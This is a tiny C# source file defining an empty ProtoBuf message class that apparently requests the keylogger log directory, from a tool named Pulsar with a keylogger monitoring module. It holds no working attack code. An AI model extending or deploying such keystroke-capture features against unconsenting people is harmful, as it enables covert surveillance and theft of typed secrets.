using ProtoBuf;
using Pulsar.Common.Messages.other;

namespace Pulsar.Common.Messages.Monitoring.KeyLogger
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectory : IMessage
    {
    }
}
